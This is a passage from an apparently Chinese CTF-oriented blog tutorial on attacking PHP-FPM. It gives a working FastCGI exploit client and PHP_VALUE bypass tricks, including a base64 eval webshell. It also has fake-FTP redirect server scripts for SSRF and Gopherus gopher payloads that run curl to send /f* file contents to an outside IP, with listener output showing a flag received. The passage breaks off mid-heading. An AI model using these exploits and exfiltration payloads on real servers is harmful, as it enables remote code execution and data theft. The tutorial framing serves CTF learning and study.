class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python fpm.py pwn.challenge.ctf.show -p 28230 /var/www/html/index.php -c &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>); <span class="hljs-keyword">exit</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>其中有一点需要注意，FPM在某版本后配置文件添加了<code>security.limit_extensions</code>选项，用于指定解析文件的后缀，并且默认值为.php，所以需要传入一个真实存在的php文件，否则会返回<code>Access denied.</code>或<code>File not found.</code></p><p>不过服务器上通常会存在一些php文件，可以用<code>find / -name &quot;*.php&quot;</code>来查找</p><h2 id="bypass-error-log"><a href="#bypass-error-log" class="headerlink" title="bypass-error_log"></a>bypass-error_log</h2><p>一般的攻击都是通过 auto_prepend_file ， auto_append_file 或者 extension 实现的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/usr|auto|extension|dir/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当部分内容被禁用时，就需要在php的设置中找到可以执行代码，或者包含文件，或者写文件的配置</p><p>其中 error_log 这个配置可以保存php的报错信息，并写入到文件中，但是会被实体编码，可以通过 html_errors 设置是否实体编码</p><p><code>&#39;PHP_VALUE&#39;: &#39;html_errors = Off\nerror_log = /var/www/html/1.php&#39;,</code></p><p>但是需要注意需要和有返回报错信息的函数互相配合使用，比如 fsockopen 函数</p><h2 id="bypass-内存马"><a href="#bypass-内存马" class="headerlink" title="bypass-内存马"></a>bypass-内存马</h2><p><code>&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On\nauto_prepend_file = &quot;data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=&quot;&#39;</code></p><h1 id="通过FTP攻击php-fpm"><a href="#通过FTP攻击php-fpm" class="headerlink" title="通过FTP攻击php-fpm"></a>通过FTP攻击php-fpm</h1><p>有的时候php-fpm并没有绑定在0.0.0.0上，而是127.0.0.1或其他地址，这个时候就需要通过ssrf来攻击php-fpm</p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>在上面的例子中，一般是可以写入shell的，但是在不能写入文件的情况下呢？</p><p>看file_put_contents在php手册中的定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span><br><br>(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>file_put_contents — 将数据写入文件<br><br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-number">0</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">int</span>|<span class="hljs-literal">false</span><br><br>和依次调用 <span class="hljs-title function_ invoke__">fopen</span>()，<span class="hljs-title function_ invoke__">fwrite</span>() 以及 <span class="hljs-title function_ invoke__">fclose</span>() 功能一样。<br></code></pre></td></tr></table></figure><p>首先调用了<code>fopen()</code>，而fopen可以打开文件或者 URL ，其中包括了<code>ftp://</code>协议</p><p>在ftp中，分为主动模式和被动模式。简单来说，主动模式是服务端的20端口去连接客户端的指定端口，被动模式是客户端连接服务端的指定端口。其中的区别就是在哪一端开放端口</p><p>既然这样，那我们可以模拟一个被动模式的ftp客户端，指定ip端口为<code>127.0.0.1:9000</code>，这样file_put_contents就会把数据包原封不动的传递给php-fpm，实现ssrf攻击fpm</p><p>模拟ftp的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">5566</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 welcome\n&#x27;</span>)<br><span class="hljs-comment">#Service ready for new user.</span><br><span class="hljs-comment">#Client send anonymous username</span><br><span class="hljs-comment">#USER anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\n&#x27;</span>)<br><span class="hljs-comment">#User name okay, need password.</span><br><span class="hljs-comment">#Client send anonymous password.</span><br><span class="hljs-comment">#PASS anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\n&#x27;</span>)<br><span class="hljs-comment">#User logged in, proceed. Logged out if appropriate.</span><br><span class="hljs-comment">#TYPE I</span><br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)<br><span class="hljs-comment">#Size /</span><br>conn.send(<span class="hljs-string">b&#x27;550 Could not get the file size.\n&#x27;</span>)<br><span class="hljs-comment">#EPSV (1)</span><br>conn.send(<span class="hljs-string">b&#x27;150 ok\n&#x27;</span>)<br><span class="hljs-comment">#PASV</span><br>conn.send(<span class="hljs-string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="hljs-comment">#STOR / (2)</span><br>conn.send(<span class="hljs-string">b&#x27;150 Permission denied.\n&#x27;</span>)<br><span class="hljs-comment">#QUIT</span><br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\n&#x27;</span>)<br>conn.close()<br></code></pre></td></tr></table></figure><p>通过Gopherus构造恶意payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lewiserii:~/Gopherus-master# python2 gopherus.py --exploit fastcgi<br><br><br>  ________              .__<br> /  _____/  ____ ______ |  |__   ___________ __ __  ______<br>/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/<br>\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \<br> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;<br>        \/       |__|        \/     \/                 \/<br><br>                author: $_SpyD3r_$<br><br>Give one file name <span class="hljs-built_in">which</span> should be surely present <span class="hljs-keyword">in</span> the server (prefer .php file)<br><span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t know press ENTER we have default one:  index.php</span><br><span class="hljs-string">Terminal command to run:  curl http://47.99.77.52:5588/?a=`cat /f*`</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your gopher link is ready to do SSRF:</span><br><span class="hljs-string"></span><br><span class="hljs-string">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------Made-by-SpyD3r-----------</span><br></code></pre></td></tr></table></figure><p>payload：</p><p>注意ftp协议的格式</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?file<span class="hljs-operator">=</span>ftp://<span class="hljs-number">47.99</span>.<span class="hljs-number">77.52</span>:<span class="hljs-number">5566</span>/test&amp;content<span class="hljs-operator">=</span><span class="hljs-variable">%01</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%08</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%F6</span><span class="hljs-variable">%06</span><span class="hljs-variable">%00</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%10</span>SERVER_SOFTWAREgo<span class="hljs-variable">%20</span>/<span class="hljs-variable">%20</span>fcgiclient<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%09</span>REMOTE_ADDR<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%08</span>SERVER_PROTOCOLHTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%02</span>CONTENT_LENGTH<span class="hljs-number">93</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%04</span>REQUEST_METHODPOST<span class="hljs-variable">%09</span>KPHP_VALUEallow_url_include<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>On<span class="hljs-variable">%0</span>Adisable_functions<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>Aauto_prepend_file<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>php<span class="hljs-variable">%3</span>A//input<span class="hljs-variable">%0</span>F<span class="hljs-variable">%09</span>SCRIPT_FILENAMEindex.php<span class="hljs-variable">%0</span>D<span class="hljs-variable">%01</span>DOCUMENT_ROOT/<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%05</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%04</span><span class="hljs-variable">%00</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>curl<span class="hljs-variable">%20</span>http<span class="hljs-variable">%3</span>A//<span class="hljs-number">47.99</span>.<span class="hljs-number">77.52</span><span class="hljs-variable">%3</span>A<span class="hljs-number">5588</span>/<span class="hljs-variable">%3</span>Fa<span class="hljs-variable">%3</span>D<span class="hljs-variable">%60</span>cat<span class="hljs-variable">%20</span>/f<span class="hljs-variable">%2</span>A<span class="hljs-variable">%60</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>Bdie<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>-----Made-by-SpyD<span class="hljs-number">3</span>r-----<span class="hljs-variable">%0</span>A<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure><p>监听端口即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@dr0n1:~# nc -lvvnp 5588<br>Listening on 0.0.0.0 5588<br>Connection received on 124.223.158.81 33340<br>GET /?a=ctfshowd99cc801-ca48-4632-9cec-c87db8594278 HTTP/1.1<br>Host: 47.99.77.52:5588<br>User-Agent: curl/7.61.1<br>Accept: */*<br><br><br></code></pre></td></tr></table></figure><p>FTP 仅起到了一个重定向 Payload 内容的作用</p><p><img src="/img/summary/php-fpm-1.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>]);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>], <span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><p>原理与上面是一样的，只不过将发送payload和重定向都放在了ftp上</p><p>第一次连接的时候返回通过Gopherus构造的payload，第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000</p><p>使用的时候注意修改payload和第一次返回的ip(第53行)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Time    : 2021/1/13 6:56 下午</span><br><span class="hljs-comment"># @Author  : tntaxin</span><br><span class="hljs-comment"># @File    : ftp_redirect.py</span><br><span class="hljs-comment"># @Software:</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br><span class="hljs-comment"># 替换gopherus生成的payload</span><br>payload = unquote(<span class="hljs-string">&quot;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0C%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.99.77.52%3A5588/%3Fa%3D%60cat%20/f%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">5566</span>  <span class="hljs-comment"># 访问端口</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment"># ftp被动模式</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">5567</span>))  <span class="hljs-comment"># 二次访问端口</span><br>sk2.listen()<br><br><span class="hljs-comment"># 计数器，用于区分是第几次ftp连接</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  客户端传来用户名</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  客户端询问文件/123的大小</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 47,99,77,52,0,5567\n&quot;</span>)  <span class="hljs-comment"># vps第二次访问的ip和端口，与上面对应，注意是逗号分割</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,0,9000\n&quot;</span>)  <span class="hljs-comment"># 重定向到9000</span><br><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># 告诉客户端可以开始数据链接了</span><br>        <span class="hljs-comment"># 新建一个socket给服务端返回我们的payload</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;建立连接!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;断开连接!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br><br>    <span class="hljs-comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>发送payload</p><p><code>?viewFile=ftp://47.99.77.52:5566/test</code></p><p>正常的输出应该如下，有第二次建立连接的过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;USER anonymous\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;TYPE I\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;SIZE /test\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;EPSV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;PASV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;RETR /test\r\n&#x27;</span><br>建立连接!<br>断开连接!<br>b<span class="hljs-string">&#x27;USER anonymous\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;TYPE I\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;SIZE /test\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;EPSV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;PASV\r\n&#x27;</span><br>b<span class="hljs-string">&#x27;STOR /test\r\n&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="攻击unix套接字模式下的php-fpm"><a href="#攻击unix套接字模式下的php-fpm" class="headerlink" title="攻击unix套接字模式下的php-fpm"></a>攻击unix套接字模式下的php-fpm</h1><p>以上的所有方法都是基于TCP通信方式进行攻击的。但是在php-fpm中还有一种unix domain socket通信方式，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了</p><p>一般来说这种通信方式不能进行ssrf，因为没有经过网络协议层</p><h2 id="加载so绕过disable-functions"><a href="#加载so绕过disable-functions" class="headerlink" 